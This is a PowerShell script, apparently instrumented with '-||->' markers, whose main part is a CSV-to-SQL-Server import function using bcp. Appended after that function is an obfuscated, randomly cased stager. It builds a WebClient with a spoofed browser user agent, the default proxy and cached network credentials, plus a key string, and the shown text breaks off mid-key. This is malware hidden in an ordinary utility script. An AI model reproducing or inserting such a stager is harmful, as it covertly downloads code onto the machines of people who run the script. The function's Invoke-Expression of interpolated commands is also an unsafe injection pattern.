 -||-> function Import-CsvToSqTable {
[CmdletBinding()]
param([string]$InstanceName
      ,[string]$Database
      ,[string]$SourceFile
      ,[string]$SqlDataType = 'VARCHAR(255)'
      ,[pscredential]$SqlCred
      ,[string]$StagingTableName
      ,[Switch]$Append
      )

    
     -||-> if( -||-> -not ( -||-> Test-Path $SourceFile <-||- ) -and $SourceFile -notlike '*.csv' <-||- ){
         -||-> Write-Error "Invalid file: $SourceFile" <-||- 
    } <-||- 

     -||-> $source =  -||-> Get-ChildItem $SourceFile <-||-  <-||- 

    
     -||-> Write-Verbose "[Clean Inputs]" <-||- 
     -||-> ( -||-> Get-Content $source <-||- ).Replace('"','') | Set-Content $source <-||- 
    
    
     -||-> $Header = ( -||-> Get-Content $source | Select-Object -First 1 <-||- ).Split(',') <-||- 
     -||-> $CleanHeader = @() <-||- 

    
    
     -||-> foreach($h in  -||-> $Header <-||- ){
         -||-> $CleanValue = $h -Replace '[^a-zA-Z0-9_]','' <-||- 
         -||-> $CleanHeader += $CleanValue <-||- 
         -||-> Write-Verbose "[Cleaned Header] $h -> $CleanValue" <-||- 
    } <-||- 

    
     -||-> if( -||-> -not $Append <-||- ){
         -||-> $sql = @( -||-> "IF EXISTS (SELECT 1 FROM sys.tables WHERE name  = '$StagingTableName') DROP TABLE [$StagingTableName];" <-||- ) <-||- 
    } else {
          -||-> $sql = @( -||-> "IF NOT EXISTS (SELECT 1 FROM sys.tables WHERE name  = '$StagingTableName')" <-||- ) <-||- 
    } <-||- 
     -||-> $sql += ( -||-> "CREATE TABLE [$StagingTableName]($( -||-> $CleanHeader[0] <-||- ) $SqlDataType `n" <-||- ) <-||- 
     -||-> $CleanHeader[1..$CleanHeader.Length] | ForEach-Object { -||-> $sql += ",$_ $SqlDataType `n" <-||- } <-||- 
     -||-> $sql += ");" <-||- 
     -||-> $sql = $sql -join "`n" <-||- 
     -||-> Write-Verbose "[CREATE TABLE Statement] $sql" <-||- 
    

     -||-> try{
         -||-> if( -||-> $SqlCred <-||- ){
             -||-> Invoke-Sqlcmd -ServerInstance $InstanceName -Database $Database -Query $sql -Username $SqlCred.UserName -Password $SqlCred.GetNetworkCredential().Password <-||- 
             -||-> $cmd = "bcp 'dbo.$StagingTableName' in '$SourceFile' -S'$InstanceName' -d'$Database' -F2 -c -t',' -U'$( -||-> $SqlCred.UserName <-||- )' -P'$( -||-> $SqlCred.GetNetworkCredential().Password <-||- )'" <-||- 
        } else {
             -||-> Invoke-Sqlcmd -ServerInstance $InstanceName -Database $Database -Query $sql <-||- 
             -||-> $cmd = "bcp 'dbo.$StagingTableName' in '$SourceFile' -S'$InstanceName' -d'$Database' -F2 -c -t',' -T" <-||- 
        } <-||- 
         -||-> Write-Verbose "[BCP Command] $cmd" <-||- 
    
         -||-> $cmdout =  -||-> Invoke-Expression $cmd <-||-  <-||- 
         -||-> if( -||-> $cmdout -join '' -like '*error*' <-||- ){
            throw  -||-> $cmdout <-||- 
        } <-||- 
         -||-> Write-Verbose "[BCP Results] $cmdout" <-||- 
         -||-> if( -||-> $SqlCred <-||- ){
             -||-> $rowcount =  -||-> Invoke-Sqlcmd -ServerInstance $InstanceName -Database $Database -Query "SELECT COUNT(1) [RowCount] FROM [$StagingTableName];" -Username $SqlCred.UserName -Password $SqlCred.GetNetworkCredential().Password <-||-  <-||- 
        } else {
             -||-> $rowcount =  -||-> Invoke-Sqlcmd -ServerInstance $InstanceName -Database $Database -Query "SELECT COUNT(1) [RowCount] FROM [$StagingTableName];" <-||-  <-||- 
        } <-||- 
         -||-> $output =  -||-> New-Object PSObject -Property @{'Instance'= -||-> $InstanceName <-||- ;'Database'= -||-> $Database <-||- ;'Table'= -||-> "$StagingTableName" <-||- ;'RowCount'= -||-> $rowcount.RowCount <-||- } <-||-  <-||- 

        return  -||-> $output <-||- 
    }
    catch{
         -||-> Write-Error $Error[0] -ErrorAction Stop <-||- 
    } <-||- 
} <-||- 
 -||-> $Wc= -||-> NEW-ObJEct SySTEM.NeT.WebClieNT <-||-  <-||- ; -||-> $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko' <-||- ; -||-> $WC.HEaderS.ADD('User-Agent',$u) <-||- ; -||-> $WC.PROxy = [System.Net.WEBREQUesT]::DEfaUltWeBProXy <-||- ; -||-> $wc.PrOxy.CReDeNTialS = [SYStEm.NEt.CredeNtIAlCAcHe]::DeFAuLTNetwORKCRedeNtiALs <-||- ; -||-> $K='X^;CsABJe\lFP2Mx:f=9*5-{/}qG


 <-||- 
